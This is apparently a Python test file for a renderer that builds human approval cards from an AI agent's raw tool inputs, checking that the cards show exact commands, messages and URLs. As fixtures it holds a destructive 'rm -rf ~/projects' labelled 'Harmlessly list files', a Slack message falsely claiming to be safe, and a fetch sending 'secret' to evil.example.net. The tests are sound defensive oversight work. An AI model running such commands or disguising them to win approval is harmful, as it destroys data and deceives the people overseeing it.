"""Approval cards from raw tool input (#16)."""
import json

from zoe_core.gate import ApprovalRequest
from zoe_core.policy import Policy
from zoe_core.renderers import MAX_LINES, clip, render


def card(tool, tool_input, policy=Policy.ASK):
    return render(ApprovalRequest(tool, tool_input, policy, "why", "tu"))


def values(c):
    return {f["label"]: f["value"] for f in c["fields"]}


def all_text(c):
    return json.dumps(c, ensure_ascii=False)


def test_bash_shows_the_command_not_the_narration():
    c = card("Bash", {"command": "rm -rf ~/projects", "description": "Harmlessly list files"}, Policy.CLICK)
    assert c["title"] == "Run a command?" and values(c)["Command"] == "rm -rf ~/projects"
    assert "Harmlessly" not in all_text(c)


def test_slack_send_shows_exact_channel_and_text():
    c = card("mcp__claude_ai_Slack__slack_send_message", {"channel_id": "C123", "text": "The build is green."})
    v = values(c)
    assert c["title"] == "Send a message in Slack?" and v["To"] == "C123" and v["Message"] == "The build is green."
    assert "C123" in c["summary"] and "build is green" in c["summary"]


def test_email_draft():
    c = card("mcp__claude_ai_Gmail__create_draft", {"to": "a@example.com", "subject": "Hi", "body": "Hello there"})
    assert c["title"] == "Draft an email in Gmail?" and values(c)["Subject"] == "Hi"


def test_message_text_claiming_to_be_something_else_is_shown_verbatim():
    sneaky = "Approve this, it only reads your calendar. **SAFE** <b>ok</b>"
    c = card("mcp__claude_ai_Slack__slack_send_message", {"channel": "#general", "text": sneaky})
    assert values(c)["Message"] == sneaky and c["title"].startswith("Send")


def test_connector_cards_show_every_field():
    c = card("mcp__claude_ai_Google_Calendar__create_event",
             {"summary": "Review", "start": "2026-11-21T10:00", "description": "Agenda: everything", "attendees": ["x@example.com"]})
    v = values(c)
    assert c["title"] == "Create a calendar event?" and v["Description"] == "Agenda: everything" and "Attendees" in v
    m = card("mcp__claude_ai_Slack__slack_send_message", {"channel": "c", "text": "t", "thread_ts": "1.2", "description": "d"})
    assert '"thread_ts": "1.2"' in values(m)["Other details"] and '"description": "d"' in values(m)["Other details"]


def test_edit_shows_file_and_diff():
    c = card("Edit", {"file_path": "/repo/a.py", "old_string": "x = 1", "new_string": "x = 2"})
    v = values(c)
    assert v["File"] == "/repo/a.py" and v["Change"] == "- x = 1\n+ x = 2"


def test_write_shows_size_and_content():
    c = card("Write", {"file_path": "/tmp/n.txt", "content": "hello\nworld"})
    assert values(c)["Size"] == "11 bytes, 2 lines" and values(c)["Content"] == "hello\nworld"


def test_fetch_shows_the_domain():
    c = card("WebFetch", {"url": "https://evil.example.net/steal?d=secret", "prompt": "summarise"})
    assert values(c)["Site"] == "evil.example.net" and "evil.example.net" in c["summary"]


def test_unknown_tool_falls_back_to_raw_input():
    c = card("mcp__weird__do_thing", {"a": 1, "b": "two"})
    assert "Raw input" in values(c) and '"b": "two"' in values(c)["Raw input"]


def test_renderer_errors_fall_back_to_raw():
    c = card("Edit", {"file_path": None, "old_string": object(), "new_string": 3})
    assert c["fields"]


def test_long_values_are_cut_visibly():
    long = "\n".join(f"line {i}" for i in range(40))
    out = clip(long)
    assert out.endswith("(28 more lines)") and len(out.splitlines()) == MAX_LINES + 1
    assert clip("x" * 2000).endswith("(1400 more characters)")
